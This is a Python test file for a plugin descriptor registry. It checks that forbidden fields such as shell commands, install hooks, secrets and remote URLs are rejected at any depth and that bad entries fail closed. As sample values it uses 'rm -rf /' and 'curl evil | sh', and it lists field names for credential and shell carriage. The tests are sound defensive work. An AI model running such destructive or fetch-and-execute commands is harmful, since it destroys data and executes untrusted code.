"""Phase 3D-H1 — Descriptor schema forbidden fields / nested alias fail-closed.

Hardens Lens 2: every forbidden field (and its alias / casing / snake_case
variant) must be rejected at any depth, and an invalid descriptor must never be
exposed as enabled. The forbidden-field denylist is the thing that keeps a
descriptive registry from becoming an execution surface (dynamic code load,
shell, SQL mutation, network fetch, secret carriage, install hook).

Phase: 3D-H1 — Static Plugin Descriptor Registry Hardening
"""

from __future__ import annotations

from typing import Any

import pytest

from hermes_cli.dev_web_plugin_descriptor_manifest import get_static_manifest
from hermes_cli.dev_web_plugin_descriptor_registry import (
    build_registry_summary,
    list_descriptor_details,
    validate_manifest,
)
from hermes_cli.dev_web_plugin_descriptor_schema import (
    FORBIDDEN_FIELDS,
    is_forbidden_field_present,
)


def _base_entry() -> dict[str, Any]:
    """Return a deep copy of the first (valid) manifest entry for mutation."""
    import copy

    return copy.deepcopy(get_static_manifest()[0])


class TestCanonicalForbiddenFields:
    @pytest.mark.parametrize(
        "field",
        [
            "pythonImportPath",
            "callable",
            "shellCommand",
            "externalUrl",
            "downloadUrl",
            "pluginPackage",
            "dynamicModule",
            "evalCode",
            "execCode",
            "sqlStatement",
            "productionPath",
            "apiKey",
            "Authorization",
            "secret",
            "localPath",
            "remoteUrl",
            "installCommand",
            "postInstallHook",
            "preExecutionHook",
            "arbitraryArgs",
        ],
    )
    def test_canonical_forbidden_field_rejected(self, field: str) -> None:
        entry = _base_entry()
        entry[field] = "evil"
        assert field in FORBIDDEN_FIELDS
        report = validate_manifest([entry])
        assert not report.valid
        # The forbidden field is the reason (fail-closed early return).
        assert any(e.field == field for e in report.errors)

    @pytest.mark.parametrize(
        "field",
        [
            "authorization",
            "AUTHORIZATION",
            "bearer",
            "Bearer",
            "api_key",
            "secretValue",
            "token",
            "accessToken",
            "callable_repr",
            "shell_command",
            "sql",
            "production_path",
            "dynamic_import",
            "importPath",
            "modulePath",
            "external_url",
            "download_url",
            "install_command",
            "post_install_hook",
            "pre_execution_hook",
        ],
    )
    def test_alias_forbidden_field_rejected(self, field: str) -> None:
        entry = _base_entry()
        entry[field] = "evil"
        assert field in FORBIDDEN_FIELDS
        assert not validate_manifest([entry]).valid


class TestNestedForbiddenFields:
    def test_forbidden_inside_metadata_schema_dict_detected(self) -> None:
        entry = {
            "pluginId": "plugin.descriptor.x",
            "metadataSchema": {"shellCommand": "rm -rf /"},
        }
        assert is_forbidden_field_present(entry) == "shellCommand"

    def test_forbidden_inside_nested_list_detected(self) -> None:
        entry = {"pluginId": "plugin.descriptor.x", "extra": [{"Authorization": "Bearer x"}]}
        assert is_forbidden_field_present(entry) == "Authorization"

    def test_forbidden_inside_owner_dict_detected(self) -> None:
        entry = {"pluginId": "plugin.descriptor.x", "owner": {"secret": "topsecret"}}
        assert is_forbidden_field_present(entry) == "secret"

    def test_forbidden_inside_deeply_nested_structure_detected(self) -> None:
        entry = {
            "pluginId": "plugin.descriptor.x",
            "a": {"b": {"c": [{"d": {"externalUrl": "https://evil"}}]}},
        }
        assert is_forbidden_field_present(entry) == "externalUrl"

    def test_validation_rejects_nested_forbidden_field(self) -> None:
        entry = _base_entry()
        # metadataSchema is normally a scalar string; smuggling a dict with a
        # forbidden key is caught by the recursive forbidden-field scan first.
        entry["metadataSchema"] = {"installCommand": "curl evil | sh"}
        report = validate_manifest([entry])
        assert not report.valid
        assert any(e.field == "installCommand" for e in report.errors)

    def test_no_forbidden_field_returns_none(self) -> None:
        entry = _base_entry()
        assert is_forbidden_field_present(entry) is None


class TestFailClosed:
    def test_invalid_descriptor_not_exposed_as_enabled(self) -> None:
        entry = _base_entry()
        entry["shellCommand"] = "rm -rf /"
        # list_descriptor_details blocks out entries carrying a forbidden field.
        details = list_descriptor_details([entry])
        assert len(details) == 1
        assert details[0]["status"] == "blocked"
        assert "shellCommand" not in details[0]

    def test_invalid_descriptor_blocks_status(self) -> None:
        entry = _base_entry()
        entry["pythonImportPath"] = "evil"
        report = validate_manifest([entry])
        summary = build_registry_summary(report)
        assert summary["status"] == "validation_failed"
        assert summary["pluginRuntimeImplemented"] is False
        assert summary["pluginExecutionAllowed"] is False

    def test_forbidden_field_never_reaches_read_model(self) -> None:
        entry = _base_entry()
        entry["apiKey"] = "sk-leak-1234567890"
        blob = repr(list_descriptor_details([entry]))
        assert "sk-leak-1234567890" not in blob
        assert "apiKey" not in blob

    def test_non_dict_entry_handled(self) -> None:
        # A non-dict entry is reported by the caller type check, not the scan.
        assert is_forbidden_field_present("not-a-dict") is None
        assert is_forbidden_field_present(None) is None
        assert is_forbidden_field_present(42) is None
